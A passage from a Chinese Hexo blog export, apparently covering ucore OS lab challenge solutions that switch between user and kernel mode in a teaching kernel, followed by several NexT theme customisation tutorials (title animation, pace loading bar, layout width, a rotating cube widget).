<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">kern/init/init.c</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lab1_switch_to_user</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//LAB1 CHALLENGE 1 : TODO</span></span><br><span class="line"><span class="comment">/*--------------------------------------------------------</span></span><br><span class="line"><span class="comment">    "sub $0x8, %%esp \n" </span></span><br><span class="line"><span class="comment">    让 SS 和 ESP 这两个寄存器 有机会 POP 出时 更新 SS 和 ESP</span></span><br><span class="line"><span class="comment">    因为 从内核态进入中断 它的特权级没有改变 是不会 push 进 SS 和 ESP的 但是我们又需要通过 POP SS 和 ESP 去修改它们</span></span><br><span class="line"><span class="comment">    进入 T_SWITCH_TOU(120) 中断</span></span><br><span class="line"><span class="comment">    将原来的栈顶指针还给esp栈底指针</span></span><br><span class="line"><span class="comment">--------------------------------------------------------*/</span></span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">"sub $0x8, %%esp \n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">"int %0 \n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">"movl %%ebp, %%esp"</span></span></span></span><br><span class="line"><span class="function"><span class="params">        : </span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">"i"</span>(T_SWITCH_TOU)</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lab1_switch_to_kernel</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//LAB1 CHALLENGE 1 :  TOD</span></span><br><span class="line"><span class="comment">/*--------------------------------------------------------</span></span><br><span class="line"><span class="comment">    进入 T_SWITCH_TOK(121) 中断</span></span><br><span class="line"><span class="comment">    将原来的栈顶指针还给esp栈底指针</span></span><br><span class="line"><span class="comment">--------------------------------------------------------*/</span></span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">"int %0 \n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">"movl %%ebp, %%esp \n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">        : </span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">"i"</span>(T_SWITCH_TOK)</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kern/trap/trap.c :</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定义临时指针 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> <span class="title">switchk2u</span>, *<span class="title">switchu2k</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">trap_dispatch</span><span class="params">(struct trapframe *tf)</span></span></span><br><span class="line"><span class="function"><span class="comment">//通过"改造"一个中断 来进入我们想进入的用户态或者内核态</span></span></span><br><span class="line">    case T_SWITCH_TOU:</span><br><span class="line">        <span class="keyword">if</span> (tf-&gt;tf_cs != USER_CS) &#123;</span><br><span class="line">            switchk2u = *tf;</span><br><span class="line">            switchk2u.tf_cs = USER_CS;</span><br><span class="line">            switchk2u.tf_ds = switchk2u.tf_es = switchk2u.tf_ss = USER_DS;</span><br><span class="line">            switchk2u.tf_eflags |= FL_IOPL_MASK; <span class="comment">// IOPL 改为 0</span></span><br><span class="line">            switchk2u.tf_esp = (<span class="keyword">uint32_t</span>)tf + <span class="keyword">sizeof</span>(struct trapframe) - <span class="number">8</span>; <span class="comment">// tf-&gt;esp的位置</span></span><br><span class="line">            <span class="comment">// iret 回到用户栈</span></span><br><span class="line">            *((<span class="keyword">uint32_t</span> *)tf - <span class="number">1</span>) = (<span class="keyword">uint32_t</span>)&amp;switchk2u;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> T_SWITCH_TOK:</span><br><span class="line">        <span class="keyword">if</span> (tf-&gt;tf_cs != KERNEL_CS) &#123;</span><br><span class="line">            tf-&gt;tf_cs = KERNEL_CS;</span><br><span class="line">            tf-&gt;tf_ds = tf-&gt;tf_es = KERNEL_DS;</span><br><span class="line">            tf-&gt;tf_eflags &amp;= ~FL_IOPL_MASK;</span><br><span class="line">            switchu2k = (struct trapframe *)(tf-&gt;tf_esp - (<span class="keyword">sizeof</span>(struct trapframe) - <span class="number">8</span>));</span><br><span class="line">            memmove(switchu2k, tf, <span class="keyword">sizeof</span>(struct trapframe) - <span class="number">8</span>);</span><br><span class="line">            *((<span class="keyword">uint32_t</span> *)tf - <span class="number">1</span>) = (<span class="keyword">uint32_t</span>)switchu2k;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>
<p>去掉42行注释</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/c5hPayt.png" alt="image-20200311193059728"></p>
<p>运行<code>make grade</code></p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/dtfEPFo.png" alt="image-20200311194238755"></p>
<p>莫名其妙的满分。。。</p>
<h1 id="扩展练习-Challenge-2"><a href="#扩展练习-Challenge-2" class="headerlink" title="扩展练习 Challenge 2"></a>扩展练习 Challenge 2</h1><p>用键盘实现用户模式内核模式切换。具体目标是：“键盘输入3时切换到用户模式，键盘输入0时切换到内核模式”。 基本思路是借鉴软中断(syscall功能)的代码，并且把trap.c中软中断处理的设置语句拿过来。</p>
<p>注意：</p>
<p>　1.关于调试工具，不建议用lab1_print_cur_status()来显示，要注意到寄存器的值要在中断完成后tranentry.S里面iret结束的时候才写回，所以再trap.c里面不好观察，建议用print_trapframe(tf)</p>
<p>　2.关于内联汇编，最开始调试的时候，参数容易出现错误，可能的错误代码如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">asm volatile ( &quot;sub $0x8, %%esp \n&quot;</span><br><span class="line">  &quot;int %0 \n&quot;</span><br><span class="line">  &quot;movl %%ebp, %%esp&quot;</span><br><span class="line">  : )</span><br></pre></td></tr></table></figure></div>
<p>要去掉参数int %0 \n这一行</p>
<p>3.软中断是利用了临时栈来处理的，所以有压栈和出栈的汇编语句。硬件中断本身就在内核态了，直接处理就可以了。</p>
<font face="黑体" color="black" size="6.5">Solution:</font>

<p>补充代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">kern/trap/trap.c</span><br><span class="line"><span class="comment">// 173行  </span></span><br><span class="line"><span class="keyword">case</span> IRQ_OFFSET + IRQ_KBD:</span><br><span class="line">        c = cons_getc();</span><br><span class="line">        cprintf(<span class="string">"kbd [%03d] %c\n"</span>, c, c);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">'0'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tf-&gt;tf_cs != KERNEL_CS) &#123;</span><br><span class="line">                tf-&gt;tf_cs = KERNEL_CS;</span><br><span class="line">                tf-&gt;tf_ds = tf-&gt;tf_ss = tf-&gt;tf_es = KERNEL_DS;</span><br><span class="line">                tf-&gt;tf_eflags &amp;= ~FL_IOPL_MASK;</span><br><span class="line">            &#125;</span><br><span class="line">            print_trapframe(tf);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">'3'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tf-&gt;tf_cs != USER_CS) &#123;</span><br><span class="line">                tf-&gt;tf_cs = USER_CS;</span><br><span class="line">                tf-&gt;tf_ds = tf-&gt;tf_ss = tf-&gt;tf_es = USER_DS;</span><br><span class="line">                tf-&gt;tf_eflags |= FL_IOPL_MASK;</span><br><span class="line">            &#125;</span><br><span class="line">            print_trapframe(tf);</span><br><span class="line">        &#125;</span><br><span class="line">	   <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>
<p>make qemu</p>
<p>键盘输入3时切换到用户模式</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/SpfyqZo.png" alt="image-20200311203258304"></p>
<p>键盘输入0时切换到内核模式</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/ChQUgEX.png" alt="image-20200311203152425"></p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo标题抖音特效</title>
    <url>/posts/349c41ac/</url>
    <content><![CDATA[<h1 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h1><p>鼠标触碰题目会有如下效果</p>
<p><img src="/images/loading.gif" data-original="/posts/349c41ac/image-20200313015633238.png" alt="image-20200313015633238"><a id="more"></a></p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>修改\themes\next\source\css_custom\custom.styl，添加如下语句即可</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYL"><figure class="iseeu highlight /styl"><table><tr><td class="code"><pre><span class="line"><span class="comment">//标题抖音化</span></span><br><span class="line"><span class="selector-class">.site-title</span>:hover, <span class="selector-class">.post-title</span>:hover &#123;</span><br><span class="line">    animation: shake-it .5s reverse infinite cubic-bezier(0.68, -0.55, 0.27, 1.55);</span><br><span class="line">&#125;</span><br><span class="line">@keyframes shake-it &#123;</span><br><span class="line">    <span class="number">0%</span> &#123;</span><br><span class="line">        text-shadow: 0 0 rgba(0, 255, 255, .5), 0 0 rgba(255, 0, 0, .5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="number">25%</span> &#123;</span><br><span class="line">        text-shadow: -2px 0 rgba(0, 255, 255, .5), 2px 0 rgba(255, 0, 0, .5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="number">50%</span> &#123;</span><br><span class="line">        text-shadow: -5px 0 rgba(0, 255, 255, .5), 3px 0 rgba(255, 0, 0, .5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="number">100%</span> &#123;</span><br><span class="line">        text-shadow: 3px 0 rgba(0, 255, 255, .5), 5px 0 rgba(255, 0, 0, .5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>重新hexo g -d即可</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
  </entry>
  <entry>
    <title>hexo-next主题美化之顶部加载条</title>
    <url>/posts/21d1124/</url>
    <content><![CDATA[<h1 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h1><p><img src="/images/loading.gif" data-original="/posts/21d1124/v2-12082242d1d6a1f7d9ac2206bdebe414_b.webp" alt="img"><a id="more"></a></p>
<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><ol>
<li>进入博客文件夹的<code>/themes/next</code>文件夹下</li>
</ol>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;themes&#x2F;next</span><br></pre></td></tr></table></figure></div>
<ol>
<li>下载安装<code>Progress module</code>，如下</li>
</ol>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;theme-next&#x2F;theme-next-pace source&#x2F;lib&#x2F;pace</span><br></pre></td></tr></table></figure></div>
<ol>
<li>在<code>/themes/next/_config.yml</code>中设置，如下</li>
</ol>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YML"><figure class="iseeu highlight /yml"><table><tr><td class="code"><pre><span class="line"><span class="number">682</span>  <span class="comment"># Progress bar in the top during page loading.</span></span><br><span class="line"><span class="attr">683  pace:</span> <span class="literal">true</span></span><br><span class="line"><span class="number">684</span>  <span class="comment"># Themes list:</span></span><br><span class="line"><span class="number">685</span>  <span class="comment">#pace-theme-big-counter</span></span><br><span class="line"><span class="number">686</span>  <span class="comment">#pace-theme-bounce</span></span><br><span class="line"><span class="number">687</span>  <span class="comment">#pace-theme-barber-shop</span></span><br><span class="line"><span class="number">688</span>  <span class="comment">#pace-theme-center-atom</span></span><br><span class="line"><span class="number">689</span>  <span class="comment">#pace-theme-center-circle</span></span><br><span class="line"><span class="number">690</span>  <span class="comment">#pace-theme-center-radar</span></span><br><span class="line"><span class="number">691</span>  <span class="comment">#pace-theme-center-simple</span></span><br><span class="line"><span class="number">692</span>  <span class="comment">#pace-theme-corner-indicator</span></span><br><span class="line"><span class="number">693</span>  <span class="comment">#pace-theme-fill-left</span></span><br><span class="line"><span class="number">694</span>  <span class="comment">#pace-theme-flash</span></span><br><span class="line"><span class="number">695</span>  <span class="comment">#pace-theme-loading-bar</span></span><br><span class="line"><span class="number">696</span>  <span class="comment">#pace-theme-mac-osx</span></span><br><span class="line"><span class="number">697</span>  <span class="comment">#pace-theme-minimal</span></span><br><span class="line"><span class="number">698</span>  <span class="comment"># For example</span></span><br><span class="line"><span class="number">699</span>  <span class="comment"># pace_theme: pace-theme-center-simple</span></span><br><span class="line"><span class="attr">700  pace_theme:</span> <span class="string">pace-theme-center-atom</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">注意注释</span></span><br><span class="line"><span class="number">773</span>    <span class="comment"># Internal version: 1.0.2</span></span><br><span class="line"><span class="number">774</span>    <span class="comment"># See: https://github.com/HubSpot/pace</span></span><br><span class="line"><span class="number">775</span>    <span class="comment"># Or use direct links below:</span></span><br><span class="line"><span class="number">776</span>    <span class="comment"># pace: //cdn.bootcss.com/pace/1.0.2/pace.min.js</span></span><br><span class="line"><span class="number">777</span>    <span class="comment"># pace_css: //cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css</span></span><br><span class="line"><span class="number">778</span>    <span class="comment">#pace: //cdn.bootcss.com/pace/1.0.2/pace.min.js</span></span><br><span class="line"><span class="number">779</span>    <span class="comment">#pace_css: //cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css</span></span><br></pre></td></tr></table></figure></div>
<ol>
<li>不同的样式效果图：</li>
<li>pace-theme-big-counter</li>
</ol>
<p><img src="/images/loading.gif" data-original="/posts/21d1124/v2-92dd3481ba0b1799bc3f48a621649444_b-1584025193681.webp" alt="img"></p>
<ul>
<li>pace-theme-bounce</li>
</ul>
<p><img src="/images/loading.gif" data-original="/posts/21d1124/v2-c5b3bbd7b28526cf7722a039f66070b5_b-1584025261684.webp" alt="img"></p>
<hr>
<ul>
<li>ace-theme-barber-shop</li>
</ul>
<p><img src="/images/loading.gif" data-original="/posts/21d1124/v2-8331f303355b0893ad00d9b80ed0acb7_b-1584025247585.webp" alt="img"></p>
<hr>
<ul>
<li>pace-theme-center-atom</li>
</ul>
<p><img src="/images/loading.gif" data-original="/posts/21d1124/v2-12082242d1d6a1f7d9ac2206bdebe414_b-1584025302296.webp" alt="img"></p>
<hr>
<ul>
<li>pace-theme-center-circle</li>
</ul>
<p><img src="/images/loading.gif" data-original="/posts/21d1124/v2-2c7a7870d2ff14bc3549c61c1bc79a55_b.webp" alt="img"></p>
<hr>
<ul>
<li>pace-theme-center-radar</li>
</ul>
<p><img src="/images/loading.gif" data-original="/posts/21d1124/v2-8a8ee1f7df9ec31ce30f9598ce340305_b.webp" alt="img"></p>
<hr>
<ul>
<li>pace-theme-center-simple</li>
</ul>
<p><img src="/images/loading.gif" data-original="/posts/21d1124/v2-fbfecb0a3f13474ffeb1c2c0b8405c5d_b.webp" alt="img"></p>
<hr>
<ul>
<li>pace-theme-corner-indicator</li>
</ul>
<p><img src="/images/loading.gif" data-original="/posts/21d1124/v2-9cc86d9a2a3cec1dd282503e1856578b_b.webp" alt="img"></p>
<hr>
<ul>
<li>pace-theme-loading-bar</li>
</ul>
<p><img src="/images/loading.gif" data-original="/posts/21d1124/v2-f96e9af5ac05cefe8843e32c8321807b_b.webp" alt="img"></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
  </entry>
  <entry>
    <title>修改hexo的主题next中的Pisces主题宽度</title>
    <url>/posts/6429c507/</url>
    <content><![CDATA[<p>在<code>source/css/_schemes/Picses/_layout.styl</code>文件末尾添加如下代码。<a id="more"></a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYL"><figure class="iseeu highlight /styl"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 以下为新增代码！！</span></span><br><span class="line">header&#123; <span class="attribute">width</span>: <span class="number">80%</span> !important; &#125;</span><br><span class="line"><span class="selector-tag">header</span><span class="selector-class">.post-header</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: auto !important;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.container</span> <span class="selector-class">.main-inner</span> &#123; <span class="attribute">width</span>: <span class="number">80%</span>; &#125;</span><br><span class="line"><span class="selector-class">.content-wrap</span> &#123; <span class="attribute">width</span>: calc(<span class="number">100%</span> - <span class="number">260px</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">  +tablet() &#123;</span><br><span class="line">    <span class="attribute">width</span>: auto !important;</span><br><span class="line">  &#125;</span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    <span class="attribute">width</span>: auto !important;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span> <span class="selector-class">.main-inner</span> &#123;</span><br><span class="line">  +tablet() &#123;</span><br><span class="line">    <span class="attribute">width</span>: auto !important;</span><br><span class="line">  &#125;</span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    <span class="attribute">width</span>: auto !important;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.content-wrap</span> &#123;</span><br><span class="line">  +tablet() &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span> !important;</span><br><span class="line">  &#125;</span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span> !important;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>hexo</category>
      </categories>
  </entry>
  <entry>
    <title>hexo添加小魔方</title>
    <url>/posts/2ad4ed84/</url>
    <content><![CDATA[<p>效果如该网站右下角所示。</p>
<p>该小魔方可以替代back-to-top按钮。<a id="more"></a></p>
<p>方法：</p>
<p><strong>具体步骤如下</strong></p>
<h1 id="添加实现代码"><a href="#添加实现代码" class="headerlink" title="添加实现代码"></a>添加实现代码</h1><p>在/themes/next/layout/ _custom/ 路径下新建cube-hollow.swig文件</p>
<p>添加如下内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">  &#x2F;*最外层容器样式*&#x2F;</span><br><span class="line">  .wrap &#123;</span><br><span class="line">    width: 0px;</span><br><span class="line">    height: 0px;</span><br><span class="line">    &#x2F;*margin: 80px;*&#x2F;</span><br><span class="line">    &#x2F;*position: relative;*&#x2F;</span><br><span class="line">    position: fixed;</span><br><span class="line">      &#x2F;*显示位置*&#x2F;</span><br><span class="line">    bottom: 150px;</span><br><span class="line">    right: 100px;</span><br><span class="line">    z-index: 999;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*包裹所有容器样式*&#x2F;</span><br><span class="line">  .cube &#123;</span><br><span class="line">    width: 0px;</span><br><span class="line">    height: 0px;</span><br><span class="line">    margin: 0 auto;</span><br><span class="line">    -webkit-transform-style: preserve-3d;</span><br><span class="line">    transform-style: preserve-3d;</span><br><span class="line">    transform: rotateX(-30deg) rotateY(-80deg);</span><br><span class="line">    animation: rotate linear 10s infinite;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  @-webkit-keyframes rotate &#123;</span><br><span class="line">    from &#123;</span><br><span class="line">      transform: rotateX(0deg) rotateY(0deg);</span><br><span class="line">    &#125;</span><br><span class="line">    to &#123;</span><br><span class="line">      transform: rotateX(360deg) rotateY(360deg);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube div &#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    &#x2F;*显示大小*&#x2F;</span><br><span class="line">    width: 50px;</span><br><span class="line">    height: 50px;</span><br><span class="line">    opacity: 0.8;</span><br><span class="line">    transition: all .4s;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*定义所有图片样式*&#x2F;</span><br><span class="line">  .pic &#123;</span><br><span class="line">    width: 50px;</span><br><span class="line">    height: 50px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube .out_front &#123;</span><br><span class="line">    transform: rotateY(0deg) translateZ(25px);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube .out_back &#123;</span><br><span class="line">    transform: translateZ(-25px) rotateY(180deg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube .out_left &#123;</span><br><span class="line">    transform: rotateY(-90deg) translateZ(25px);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube .out_right &#123;</span><br><span class="line">    transform: rotateY(90deg) translateZ(25px);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube .out_top &#123;</span><br><span class="line">    transform: rotateX(90deg) translateZ(25px);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube .out_bottom &#123;</span><br><span class="line">    transform: rotateX(-90deg) translateZ(25px);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*定义小正方体样式*&#x2F;</span><br><span class="line">  .cube span &#123;</span><br><span class="line">    display: block;</span><br><span class="line">    width: 25px;</span><br><span class="line">    height: 25px;</span><br><span class="line">    position: absolute;</span><br><span class="line">    top: 12px;</span><br><span class="line">    left: 12px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube .in_pic &#123;</span><br><span class="line">    width: 25px;</span><br><span class="line">    height:25px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube .in_front &#123;</span><br><span class="line">    transform: rotateY(0deg) translateZ(12px);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube .in_back &#123;</span><br><span class="line">    transform: translateZ(-12px) rotateY(180deg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube .in_left &#123;</span><br><span class="line">    transform: rotateY(-90deg) translateZ(12px);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube .in_right &#123;</span><br><span class="line">    transform: rotateY(90deg) translateZ(12px);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube .in_top &#123;</span><br><span class="line">    transform: rotateX(90deg) translateZ(12px);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube .in_bottom &#123;</span><br><span class="line">    transform: rotateX(-90deg) translateZ(12px);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*鼠标移入后样式*&#x2F;</span><br><span class="line">  .cube:hover .out_front &#123;</span><br><span class="line">    transform: rotateY(0deg) translateZ(50px);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube:hover .out_back &#123;</span><br><span class="line">    transform: translateZ(-50px) rotateY(180deg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube:hover .out_left &#123;</span><br><span class="line">    transform: rotateY(-90deg) translateZ(50px);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube:hover .out_right &#123;</span><br><span class="line">    transform: rotateY(90deg) translateZ(50px);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube:hover .out_top &#123;</span><br><span class="line">    transform: rotateX(90deg) translateZ(50px);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .cube:hover .out_bottom &#123;</span><br><span class="line">    transform: rotateX(-90deg) translateZ(50px);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;wrap&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--包裹所有元素的容器--&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;cube&quot;&gt;</span><br><span class="line">        &lt;!--前面图片 --&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;out_front&quot;&gt;</span><br><span class="line">          &lt;a onclick&#x3D;&quot;back2top()&quot;&gt;</span><br><span class="line">              &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Aurthoria&#x2F;Pictures&#x2F;master&#x2F;img&#x2F;20200309224636.png&quot; class&#x3D;&quot;pic&quot; &#x2F;&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;!--后面图片 --&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;out_back&quot;&gt;</span><br><span class="line">            &lt;a onclick&#x3D;&quot;back2top()&quot;&gt;</span><br><span class="line">              &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Aurthoria&#x2F;Pictures&#x2F;master&#x2F;img&#x2F;20200309224636.png&quot; class&#x3D;&quot;pic&quot; &#x2F;&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;!--左面图片 --&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;out_left&quot;&gt;</span><br><span class="line">            &lt;a onclick&#x3D;&quot;back2top()&quot;&gt;</span><br><span class="line">              &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Aurthoria&#x2F;Pictures&#x2F;master&#x2F;img&#x2F;20200309224636.png&quot; class&#x3D;&quot;pic&quot; &#x2F;&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;!--右面图片 --&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;out_right&quot;&gt;</span><br><span class="line">            &lt;a onclick&#x3D;&quot;back2top()&quot;&gt;</span><br><span class="line">                &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Aurthoria&#x2F;Pictures&#x2F;master&#x2F;img&#x2F;20200309224636.png&quot; class&#x3D;&quot;pic&quot; &#x2F;&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;!--上面图片 --&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;out_top&quot;&gt;</span><br><span class="line">            &lt;a onclick&#x3D;&quot;back2top()&quot;&gt;</span><br><span class="line">                &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Aurthoria&#x2F;Pictures&#x2F;master&#x2F;img&#x2F;20200309224636.png&quot; class&#x3D;&quot;pic&quot; &#x2F;&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;!--下面图片 --&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;out_bottom&quot;&gt;</span><br><span class="line">            &lt;a onclick&#x3D;&quot;back2top()&quot;&gt;</span><br><span class="line">                &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Aurthoria&#x2F;Pictures&#x2F;master&#x2F;img&#x2F;20200309224636.png&quot; class&#x3D;&quot;pic&quot; &#x2F;&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--小正方体 --&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;in_front&quot;&gt;</span><br><span class="line">            &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Aurthoria&#x2F;Pictures&#x2F;master&#x2F;img&#x2F;20200309224636.png&quot; class&#x3D;&quot;in_pic&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;in_back&quot;&gt;</span><br><span class="line">             &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Aurthoria&#x2F;Pictures&#x2F;master&#x2F;img&#x2F;20200309224636.png&quot; class&#x3D;&quot;in_pic&quot; &#x2F;&gt;</span><br><span class="line">        